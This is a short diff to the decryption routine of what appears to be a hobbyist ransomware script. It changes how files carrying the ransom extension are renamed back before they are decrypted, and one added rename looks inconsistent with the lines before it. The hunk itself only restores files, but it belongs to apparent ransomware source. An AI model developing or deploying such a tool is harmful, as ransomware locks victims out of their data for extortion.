@@ -81,17 +81,18 @@ def dransom(passw, ext, path):
     i = 0;
     while i < len(files):
         if files[i] != thisFile:
+            if os.path.splitext(files[i])[1]:
+                if os.path.splitext(files[i])[1] == f".{ext}":
+                    os.rename(f"{files[i][2:]}", f"{files[i][2:-(len(ext)+1)]}")
+                    files[i] = files[i][:-(len(ext)+1)]
             print(f"Decrypting file {files[i]}...")
             f = open(files[i], "r+")
             fContent = f.read()
             fContent = fContent.split("+")
             if os.path.splitext(files[i])[1]:
-                if os.path.splitext(files[i])[1] != f".{ext}":
-                    os.rename(f"{files[i][2:]}", f"{files[i][2:]}.{ext}")
+                if os.path.splitext(files[i])[1] == f".{ext}":
+                    os.rename(f"{files[i][2:]}", f"{files[i][2:-1]}")
 
-            if not os.path.splitext(files[i])[1]:
-                if not os.path.exists(f"{files[i][2:]}.{ext}"):
-                    os.rename(f"{files[i][2:]}", f"{files[i][2:]}.{ext}")
             f.close()
             try:
                 f = open(files[i], "r+b")
